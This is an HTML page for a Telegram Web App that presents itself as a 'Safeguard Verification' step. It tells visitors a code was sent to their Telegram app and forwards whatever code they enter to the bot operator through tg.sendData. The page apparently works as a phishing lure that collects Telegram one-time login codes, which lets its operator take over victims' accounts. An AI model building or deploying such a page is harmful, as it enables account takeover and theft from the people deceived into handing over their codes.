<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Safeguard Verification</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <link rel="stylesheet" href="style.css">
    <style>
        body { text-align: center; font-family: Arial, sans-serif; background: #111; color: white; }
        .container { margin-top: 50px; }
        input, button { padding: 10px; margin: 10px; font-size: 16px; }
    </style>
</head>
<body>
    <div class="container">
        <h2>Safeguard Verification</h2>
        <p>We've sent a code to your Telegram app.</p>
        <input type="text" id="codeInput" placeholder="Enter Code">
        <button onclick="verifyCode()">Submit</button>
    </div>


    <script>
        let tg = window.Telegram.WebApp;
        tg.expand();


        function verifyCode() {
            let code = document.getElementById("codeInput").value;
            if (code) {
                tg.sendData(JSON.stringify({ action: "verify", code: code }));
            } else {
                alert("Enter a valid code!");
            }
        }
    </script>
</body>
</html>
